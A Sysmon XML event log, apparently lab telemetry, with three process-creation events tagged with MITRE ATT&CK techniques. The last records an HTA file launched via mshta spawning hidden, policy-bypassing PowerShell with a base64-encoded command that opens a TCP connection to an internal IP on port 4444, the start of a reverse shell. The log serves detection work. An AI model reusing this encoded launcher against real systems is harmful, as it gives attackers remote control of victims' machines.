<?xml version="1.0" encoding="UTF-8"?>
<Events>
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
         <EventID>1</EventID>
         <Version>5</Version>
         <Level>4</Level>
         <Task>1</Task>
         <Opcode>0</Opcode>
         <Keywords>0x8000000000000000</Keywords>
         <TimeCreated SystemTime="2024-12-01T16:05:11.8573590Z" />
         <EventRecordID>4942</EventRecordID>
         <Correlation />
         <Execution ProcessID="4028" ThreadID="5104" />
         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
         <Computer>win11v.condef.local</Computer>
         <Security UserID="S-1-5-18" />
      </System>
      <EventData>
         <Data Name="RuleName">technique_id=T1033,technique_name=System Owner/User Discovery</Data>
         <Data Name="UtcTime">2024-12-01 16:05:11.850</Data>
         <Data Name="ProcessGuid">{f3565dc0-8937-674c-7801-000000000c00}</Data>
         <Data Name="ProcessId">9388</Data>
         <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
         <Data Name="Description">whoami - displays logged on user information</Data>
         <Data Name="Product">Microsoft® Windows® Operating System</Data>
         <Data Name="Company">Microsoft Corporation</Data>
         <Data Name="OriginalFileName">whoami.exe</Data>
         <Data Name="CommandLine">whoami  /groups</Data>
         <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
         <Data Name="User">CONDEF\Administrator</Data>
         <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
         <Data Name="LogonId">0x16ad6e</Data>
         <Data Name="TerminalSessionId">1</Data>
         <Data Name="IntegrityLevel">High</Data>
         <Data Name="Hashes">SHA1=C23488BA47972B04F795D34B35C8257EC4B7AC9D,MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED</Data>
         <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-7201-000000000c00}</Data>
         <Data Name="ParentProcessId">6124</Data>
         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
         <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
         <Data Name="ParentUser">CONDEF\Administrator</Data>
      </EventData>
   </Event>
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
         <EventID>1</EventID>
         <Version>5</Version>
         <Level>4</Level>
         <Task>1</Task>
         <Opcode>0</Opcode>
         <Keywords>0x8000000000000000</Keywords>
         <TimeCreated SystemTime="2024-12-01T16:12:45.3421870Z" />
         <EventRecordID>4961</EventRecordID>
         <Correlation />
         <Execution ProcessID="4028" ThreadID="5104" />
         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
         <Computer>win11v.condef.local</Computer>
         <Security UserID="S-1-5-18" />
      </System>
      <EventData>
         <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
         <Data Name="UtcTime">2024-12-01 16:12:45.335</Data>
         <Data Name="ProcessGuid">{f3565dc0-8b4d-674c-8c01-000000000c00}</Data>
         <Data Name="ProcessId">7832</Data>
         <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
         <Data Name="Description">Windows PowerShell</Data>
         <Data Name="Product">Microsoft® Windows® Operating System</Data>
         <Data Name="Company">Microsoft Corporation</Data>
         <Data Name="OriginalFileName">PowerShell.EXE</Data>
         <Data Name="CommandLine">powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command "Get-Process"</Data>
         <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
         <Data Name="User">CONDEF\Administrator</Data>
         <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
         <Data Name="LogonId">0x16ad6e</Data>
         <Data Name="TerminalSessionId">1</Data>
         <Data Name="IntegrityLevel">High</Data>
         <Data Name="Hashes">SHA1=AACCFB99CCBA7827A08AA58A95EC3D5A4B4D7E57,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=A56C6A8B5E73686D78F5F4AC01DC3B6A</Data>
         <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-7201-000000000c00}</Data>
         <Data Name="ParentProcessId">6124</Data>
         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
         <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
         <Data Name="ParentUser">CONDEF\Administrator</Data>
      </EventData>
   </Event>
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
         <EventID>1</EventID>
         <Version>5</Version>
         <Level>4</Level>
         <Task>1</Task>
         <Opcode>0</Opcode>
         <Keywords>0x8000000000000000</Keywords>
         <TimeCreated SystemTime="2024-12-01T16:18:33.7912340Z" />
         <EventRecordID>4987</EventRecordID>
         <Correlation />
         <Execution ProcessID="4028" ThreadID="5104" />
         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
         <Computer>win11v.condef.local</Computer>
         <Security UserID="S-1-5-18" />
      </System>
      <EventData>
         <Data Name="RuleName">technique_id=T1027,technique_name=Obfuscated Files or Information</Data>
         <Data Name="UtcTime">2024-12-01 16:18:33.784</Data>
         <Data Name="ProcessGuid">{f3565dc0-8e19-674c-a301-000000000c00}</Data>
         <Data Name="ProcessId">3116</Data>
         <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
         <Data Name="Description">Windows PowerShell</Data>
         <Data Name="Product">Microsoft® Windows® Operating System</Data>
         <Data Name="Company">Microsoft Corporation</Data>
         <Data Name="OriginalFileName">PowerShell.EXE</Data>
         <Data Name="CommandLine">powershell.exe  -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtAD0AJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=</Data>
         <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
         <Data Name="User">CONDEF\jsmith</Data>
         <Data Name="LogonGuid">{f3565dc0-7fa2-674c-3c11-0d0000000000}</Data>
         <Data Name="LogonId">0x0d113c</Data>
         <Data Name="TerminalSessionId">1</Data>
         <Data Name="IntegrityLevel">Medium</Data>
         <Data Name="Hashes">SHA1=AACCFB99CCBA7827A08AA58A95EC3D5A4B4D7E57,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=A56C6A8B5E73686D78F5F4AC01DC3B6A</Data>
         <Data Name="ParentProcessGuid">{f3565dc0-8d4a-674c-9f01-000000000c00}</Data>
         <Data Name="ParentProcessId">5480</Data>
         <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
         <Data Name="ParentCommandLine">mshta.exe  "C:\Users\jsmith\AppData\Local\Temp\update.hta"</Data>
         <Data Name="ParentUser">CONDEF\jsmith</Data>
      </EventData>
   </Event>
</Events>
